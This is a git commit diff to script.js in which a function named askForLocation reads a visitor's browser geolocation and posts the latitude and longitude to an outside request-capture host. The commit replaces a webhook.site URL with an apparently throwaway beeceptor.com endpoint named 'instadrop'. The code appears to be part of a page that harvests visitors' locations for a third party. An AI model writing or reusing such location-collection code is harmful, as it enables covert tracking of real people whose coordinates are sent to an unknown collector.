13bf051f06d29c7325c57c5c8685d2001be6eba3
q-u-e-s-o <163966390+q-u-e-s-o@users.noreply.github.com>
2025-06-20 15:17:37 -0700

    Update script.js

--- script.js
+++ script.js
@@ -9,7 +9,7 @@ function askForLocation() {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
 
-      fetch("https://webhook.site/2b377214-0f62-4811-8d77-38ee0db23314", {
+      fetch("https://instadrop.free.beeceptor.com", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude: lat, longitude: lon }),
